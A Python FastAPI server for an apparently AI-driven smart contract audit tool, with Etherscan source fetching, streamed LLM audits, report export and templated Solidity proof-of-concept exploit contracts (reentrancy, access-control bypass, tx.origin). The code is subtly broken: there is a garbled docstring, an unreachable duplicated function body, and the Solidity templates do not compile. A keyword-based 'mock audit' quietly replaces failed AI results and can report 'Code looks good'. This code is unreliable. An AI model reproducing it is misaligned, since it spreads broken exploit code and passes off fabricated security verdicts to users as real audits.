#!/usr/bin/env python3
"""
Solidify API Server
FastAPI backend with AI streaming and Etherscan integration
"""

import asyncio
import uuid
import os
import json
import logging
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
from typing import Optional, Dict, Any, List
import aiohttp

logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger(__name__)

app = FastAPI(title="Solidify API", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory storage
audit_tasks: Dict[str, Dict[str, Any]] = {}

# Chain configurations
CHAINS = {
    "ethereum": {
        "id": "ethereum",
        "name": "Ethereum",
        "chain_id": 1,
        "explorer": "etherscan.io",
        "api": "api.etherscan.io",
    },
    "bsc": {
        "id": "bsc",
        "name": "BNB Chain",
        "chain_id": 56,
        "explorer": "bscscan.com",
        "api": "api.bscscan.com",
    },
    "polygon": {
        "id": "polygon",
        "name": "Polygon",
        "chain_id": 137,
        "explorer": "polygonscan.com",
        "api": "api.polygonscan.com",
    },
    "arbitrum": {
        "id": "arbitrum",
        "name": "Arbitrum",
        "chain_id": 42161,
        "explorer": "arbiscan.io",
        "api": "api.arbiscan.io",
    },
    "optimism": {
        "id": "optimism",
        "name": "Optimism",
        "chain_id": 10,
        "explorer": "optimistic.etherscan.io",
        "api": "api-optimistic.etherscan.io",
    },
}

ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY", "YourApiKeyToken")


class AuditRequest(BaseModel):
    code: Optional[str] = None
    address: Optional[str] = None
    chain: str = "ethereum"
    provider: str = "nvidia"
    model: str = "minimaxai/minimax-m2.5"
    command: str = "audit"


# ============================================================================
# ETHERSCAN API
# ============================================================================


async def fetch_contract_source(address: str, chain: str) -> Optional[str]:
    """Fetch verified contract source from Etherscan"""
    chain_config = CHAINS.get(chain, CHAINS["ethereum"])
    api_url = f"https://{chain_config['api']}/api"

    params = {
        "module": "contract",
        "action": "getsourcecode",
        "address": address,
        "apikey": ETHERSCAN_API_KEY,
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, params=params) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get("status") == "1" and data.get("result"):
                        source = data["result"][0].get("SourceCode", "")
                        if source:
                            return source
    except Exception as e:
        logger.error(f"Etherscan fetch error: {e}")
    return None


# ============================================================================
# AI PROVIDER INTEGRATION
# ============================================================================


async def generate_audit_stream(
    task_id: str, code: str, chain: str, provider: str, model: str
):
    """Run AI-powered audit with streaming"""
    try:
        from providers.provider_factory import create_provider

        # Update status
        audit_tasks[task_id]["status"] = "connecting"
        audit_tasks[task_id]["progress"] = 10
        yield f"data: {json.dumps({'status': 'connecting', 'progress': 10})}\n\n"

        # Create provider
        providerInstance = create_provider(
            provider or "nvidia", model=model or "minimaxai/minimax-m2.5"
        )
        if not providerInstance:
            raise Exception("Failed to create AI provider")

        audit_tasks[task_id]["status"] = "analyzing"
        audit_tasks[task_id]["progress"] = 30
        yield f"data: {json.dumps({'status': 'analyzing', 'progress': 30})}\n\n"

        # Build audit prompt
        prompt = f"""You are a smart contract security auditor. Analyze this {chain} Solidity code for vulnerabilities.

Provide a JSON audit report with:
1. "score" - Security score 0-10
2. "vulnerabilities" - Array of issues with:
   - "type": Vulnerability name
   - "severity": CRITICAL/HIGH/MEDIUM/LOW/INFO
   - "location": Code location
   - "description": Plain English explanation
   - "recommendation": How to fix
   - "cvss": CVSS score 0-10
3. "summary": Brief executive summary

Consider these common vulnerabilities:
- Reentrancy attacks
- Access control issues  
- Integer overflow/underflow
- Unchecked external calls
- Timestamp dependency
- tx.origin usage
- Unprotected Ether withdrawals
- Flash loan vulnerabilities

Contract:
```{code}```

Return ONLY valid JSON, no explanation:"""

        # Stream AI response
        full_response = ""
        async for chunk in providerInstance.generate_stream(prompt):
            full_response += chunk
            yield f"data: {json.dumps({'status': 'streaming', 'chunk': chunk})}\n\n"

        # Parse response
        audit_tasks[task_id]["status"] = "completed"
        audit_tasks[task_id]["progress"] = 100

        # Try to parse JSON from response
        try:
            # Find JSON in response
            start = full_response.find("{")
            end = full_response.rfind("}") + 1
            if start >= 0 and end > start:
                json_str = full_response[start:end]
                result = json.loads(json_str)
            else:
                result = generate_mock_audit(code)
        except:
            result = generate_mock_audit(code)

        audit_tasks[task_id]["result"] = result
        yield f"data: {json.dumps({'status': 'completed', 'result': result})}\n\n"

    except Exception as e:
        logger.error(f"Audit error: {e}")
        audit_tasks[task_id]["status"] = "failed"
        audit_tasks[task_id]["error"] = str(e)
        yield f"data: {json.dumps({'status': 'failed', 'error': str(e)})}\n\n"


def generate_mock_audit(code: str) -> Dict[str, Any]:
    """Fallback mock audit"""
    vulns = []
    code_lower = code.lower()

    if "withdraw" in code_lower:
        if (
            "onlyowner" not in code_lower
            and "require(msg.sender == owner)" not in code_lower
        ):
            vulns.append(
                {
                    "type": "Missing Access Control",
                    "severity": "CRITICAL",
                    "location": "withdraw()",
                    "description": "No owner check on withdraw",
                    "recommendation": "Add require(msg.sender == owner)",
                    "cvss": 9.1,
                }
            )
    if "transfer(" in code_lower:
        vulns.append(
            {
                "type": "Insecure External Call",
                "severity": "HIGH",
                "location": "transfer",
                "description": "Using legacy transfer",
                "recommendation": "Use SafeERC20",
                "cvss": 7.5,
            }
        )
    if "tx.origin" in code_lower:
        vulns.append(
            {
                "type": "tx.origin Vulnerability",
                "severity": "MEDIUM",
                "location": "global",
                "description": "tx.origin is vulnerable to phishing",
                "recommendation": "Use msg.sender",
                "cvss": 5.0,
            }
        )
    if "now" in code_lower:
        vulns.append(
            {
                "type": "Timestamp Dependency",
                "severity": "LOW",
                "location": "timestamp",
                "description": "now() is unreliable",
                "recommendation": "Use block.timestamp",
                "cvss": 2.5,
            }
        )
    if not vulns:
        vulns.append(
            {
                "type": "No Issues",
                "severity": "INFO",
                "location": "N/A",
                "description": "Code looks good",
                "cvss": 0.0,
            }
        )

    score = 10.0
    for v in vulns:
        if v["severity"] == "CRITICAL":
            score -= 3.0
        elif v["severity"] == "HIGH":
            score -= 2.0
        elif v["severity"] == "MEDIUM":
            score -= 1.0
        elif v["severity"] == "LOW":
            score -= 0.5

    return {
        "score": max(0, round(score, 1)),
        "vulnerabilities": vulns,
        "summary": f"Found {len(vulns)} issues",
    }


# ============================================================================
# API ENDPOINTS
# ============================================================================


@app.get("/api/chains")
async def get_chains():
    return list(CHAINS.values())


class ChatRequest(BaseModel):
    message: str
    history: Optional[List[Dict[str, str]]] = []


@app.post("/api/chat")
async def chat(request: ChatRequest):
    """Chat with AI about smart contract security"""
    try:
        from providers.provider_factory import create_provider

        # Build conversation
        history_text = ""
        for msg in request.history[-5:]:
            role = msg.get("role", "user")
            history_text += f"{role}: {msg.get('content', '')}\n"

        prompt = f"""You are Solidify, a smart contract security expert. Answer the user's question helpfully and technically.

{history_text}
user: {request.message}

expert:"""

        provider = create_provider("nvidia", "minimaxai/minimax-m2.5")
        if not provider:
            return {"error": "Provider not available"}

        response = await provider.generate(prompt)
        content = response.content if hasattr(response, "content") else str(response)

        return {"message": content, "role": "assistant"}

    except Exception as e:
        logger.error(f"Chat error: {e}")
        return {
            "message": "Sorry, I encountered an error. Please try again.",
            "error": str(e),
        }


@app.post("/api/audit/start")
async def start_audit(request: AuditRequest):
    task_id = str(uuid.uuid4())[:8]

    # Get code - either direct or from on-chain
    code = request.code
    if request.address:
        code = await fetch_contract_source(request.address, request.chain)
        if not code:
            raise HTTPException(
                status_code=404, detail="Contract not found or not verified"
            )

    if not code:
        raise HTTPException(status_code=400, detail="Code or address required")

    audit_tasks[task_id] = {
        "task_id": task_id,
        "type": "address" if request.address else "code",
        "input": request.address or "direct code",
        "code": code,
        "chain": request.chain,
        "provider": request.provider,
        "model": request.model,
        "status": "queued",
        "progress": 0,
        "result": None,
    }

    return {"task_id": task_id, "status": "started"}


@app.get("/api/audit/stream/{task_id}")
async def stream_audit(task_id: str):
    """Streaming AI audit response"""
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")

    task = audit_tasks[task_id]

    async def event_generator():
        # Get stored input
        code = task.get("code", "")
        chain = task.get("chain", "ethereum")
        provider = task.get("provider", "nvidia")
        model = task.get("model", "minimaxai/minimax-m2.5")

        async for chunk in generate_audit_stream(task_id, code, chain, provider, model):
            yield chunk

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.get("/api/audit/status/{task_id}")
async def get_status(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    return {
        "task_id": task_id,
        "status": task["status"],
        "progress": task.get("progress", 0),
    }


@app.get("/api/audit/report/{task_id}")
async def get_report(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task["status"] != "completed":
        return {"status": task["status"], "progress": task.get("progress", 0)}
    return task.get("result", {})


# ============================================================================
# EXPORT FEATURES (PDF, Markdown, PoC)
# ============================================================================

def generate_markdown_report(result: dict) -> str:
    """Generate Markdown audit report"""
    md = f"""# Solidify Security Audit Report

## Summary
- **Security Score**: {result.get('score', 'N/A')}/10
- **Vulnerabilities Found**: {len(result.get('vulnerabilities', []))}

{result.get('summary', '')}

---

## Vulnerabilities

"""
    for v in result.get('vulnerabilities', []):
        md += f"""### [{v.get('severity', 'INFO')}] {v.get('type', 'Unknown')}
- **Location**: `{v.get('location', 'N/A')}`
- **CVSS**: {v.get('cvss', 'N/A')}
- **Description**: {v.get('description', '')}

"""
        if v.get('recommendation'):
            md += f"""- **Recommendation**: {v.get('recommendation')}

"""
        if v.get('patch'):
            md += f"""**Secure Patch:**
```solidity
{v.get('patch')}
```

"""
    return md


def generate_poc_exploit(vuln: dict, target_contract: str) -> str:
    """Generate Proof-of-C概念 exploit contract"""
    vuln_type = vuln.get('type', '').lower()
    vuln_name = vuln.get('type', 'Unknown')
    
    if 'reentrancy' in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    address target;
}

contract ReentrancyAttacker {
    address public victim;
    uint public balance;
    
    constructor(address _victim) {
        victim = _victim;
    }
    
    function attack() external payable {
        (bool ok, ) = victim.call{value: msg.value}("withdraw");
        require(ok, "call failed");
    }
    
    receive() external payable {
        if (victim.balance >= 1 ether) {
            (bool ok, ) = victim.call{value: 0}("withdraw");
        }
    }
}"""
    
    elif 'access control' in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControlBypass {
    function exploit(address target) external {
        (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(ok, "Access denied - vulnerable if succeeds");
    }
}"""
    
    elif 'overflow' in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OverflowExploit {
    function exploit() external pure returns (uint256) {
        uint256 amount = type(uint256).max;
        unchecked {
            return amount + 1;
        }
    }
}"""
    
    elif 'tx.origin' in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TxOriginExploit {
    address public attacker;
    
    constructor(address _attacker) {
        attacker = _attacker;
    }
    
    function exploit(address target) external {
        // Withdraw to attacker instead of original owner
        (bool ok, ) = target.call{value: 0}("withdrawTo(address)", attacker);
    }
}"""
    
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract GenericExploit {{
    string public vulnType = "{vuln_name}";
    // Add exploit logic here
}}"""
    """Generate Proof-of-Concept exploit contract"""
    vuln_type = vuln.get('type', '').lower()
    
    if 'reentrancy' in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    address target;
}

contract ReentrancyAttacker {
    address public victim;
    uint public balance;
    
    constructor(address _victim) {
        victim = _victim;
    }
    
    function attack() external payable {
        (bool ok, ) = victim.call{value: msg.value}("withdraw");
        require(ok, "call failed");
    }
    
    receive() external payable {
        if (victim.balance >= 1 ether) {
            (bool ok, ) = victim.call{value: 0}("withdraw");
        }
    }
}"""
    
    elif 'access control' in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PoC: Try calling the protected function from a non-owner account
contract AccessControlBypass {
    function exploit(address target) external {
        // Call will revert if access control is properly implemented
        (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(ok, "Access denied - but vulnerable if this succeeds");
    }
}"""
    
    elif 'overflow' in vuln_type:
        return """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OverflowExploit {
    function exploit() external pure returns (uint256) {
        uint256 amount = type(uint256).max;
        unchecked {
            return amount + 1; // Wraps to 0 if no SafeMath
        }
    }
}"""
    
    else:
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// PoC for {vuln.get('type')}
contract GenericExploit {{
    // Add exploit logic for {vuln.get('type')}}
}}""".replace('{{', '{').replace('}}', '}')


def generate_test_case(code: str, vuln: dict) -> str:
    """Generate Foundry/Hardhat test case"""
    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "{{./TargetContract.sol}}";

contract {vuln.get('type', 'Test').replace(' ', '')}Test is Test {{
    function test_{{vuln.get('type', 'vulnerability').replace(' ', '_').lower()}}() public {{
        // Test case for {vuln.get('type')}
        vm.expectRevert();
        // Add test logic
    }}
}}"""


@app.get("/api/export/markdown/{task_id}")
async def export_markdown(task_id: str):
    """Export audit as Markdown"""
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    
    result = task.get("result", {})
    md = generate_markdown_report(result)
    
    from fastapi.responses import PlainTextResponse
    return PlainTextResponse(content=md, media_type="text/markdown")


@app.get("/api/export/pdf/{task_id}")
async def export_pdf(task_id: str):
    """Export audit as PDF"""
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    
    result = task.get("result", {})
    # Simple text-based PDF representation (in production use reportlab/weasyprint)
    markdown = generate_markdown_report(result)
    pdf_content = f"""
Solidify Security Audit Report
========================
SCORE: {result.get('score', 'N/A')}/10
VULNERABILITIES: {len(result.get('vulnerabilities', []))}

{result.get('summary', '')}

[Detailed report in Markdown format - see /export/markdown/{task_id}]
"""
    
    from fastapi.responses import PlainTextResponse
    return PlainTextResponse(content=pdf_content, media_type="application/pdf")


@app.get("/api/poc/{task_id}")
async def get_poc(task_id: str):
    """Get PoC exploits for all vulnerabilities"""
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    
    result = task.get("result", {})
    target = task.get("input", "TargetContract")
    pocs = []
    
    for v in result.get("vulnerabilities", []):
        if v.get("severity") in ["CRITICAL", "HIGH"]:
            pocs.append({
                "vulnerability": v.get("type"),
                "severity": v.get("severity"),
                "exploit_code": generate_poc_exploit(v, target),
                "test_case": generate_test_case(target, v),
            })
    
    return {"pocs": pocs}


# ============================================================================
# ADVANCED DETECTION
# ============================================================================

@app.post("/api/detect/gas")
async def detect_gas(code: str):
    """Detect gas optimization opportunities"""
    issues = []
    code_lower = code.lower()
    
    if "storage" in code_lower and ".balance" in code_lower:
        issues.append({
            "type": "Cached Balance",
            "location": "balance check",
            "issue": "Reading balance multiple times",
            "recommendation": "Cache balance in local variable",
            "savings": "~2000 gas per call",
        })
    
    if "loop" in code_lower:
        issues.append({
            "type": "Loop Optimization",
            "location": "for loop",
            "issue": "Dynamic array iteration",
            "recommendation": "Use for loop with length cached",
            "savings": "~100 gas per iteration",
        })
    
    return {"optimizations": issues}


@app.post("/api/detect/frontrun")
async def detect_frontrun(code: str):
    """Detect front-running vulnerabilities"""
    issues = []
    code_lower = code.lower()
    
    if "swap" in code_lower or "exchange" in code_lower:
        issues.append({
            "type": "Sandwich Vulnerable",
            "location": "swap function",
            "issue": "No slippage protection",
            "recommendation": "Add minimum token amount out",
            "severity": "HIGH",
        })
    
    if "approve" in code_lower and "unlimited" in code_lower:
        issues.append({
            "type": "Unlimited Approval",
            "location": "approve",
            "issue": "Unlimited token approval",
            "recommendation": "Set specific allowance",
            "severity": "MEDIUM",
        })
    
    return {"vulnerabilities": issues}


@app.post("/api/detect/oracle")
async def detect_oracle(code: str):
    """Detect oracle manipulation risks"""
    issues = []
    code_lower = code.lower()
    
    if "price" in code_lower and ("lottery" in code_lower or "lotto" in code_lower):
        issues.append({
            "type": "Price Oracle Manipulation",
            "location": "price check",
            "issue": "Using unreliable price source",
            "recommendation": "Use Chainlink oracle",
            "severity": "CRITICAL",
        })
    
    if "block.timestamp" in code_lower and "award" in code_lower:
        issues.append({
            "type": "Timestamp Dependency",
            "location": "block.timestamp",
            "issue": "Miner can manipulate timestamp",
            "recommendation": "Use Chainlink or time window",
            "severity": "MEDIUM",
        })
    
    return {"vulnerabilities": issues}


if __name__ == "__main__":
    import uvicorn

    logger.info("Starting Solidify API server on http://localhost:8000")
    uvicorn.run(app, host="0.0.0.0", port=8001)
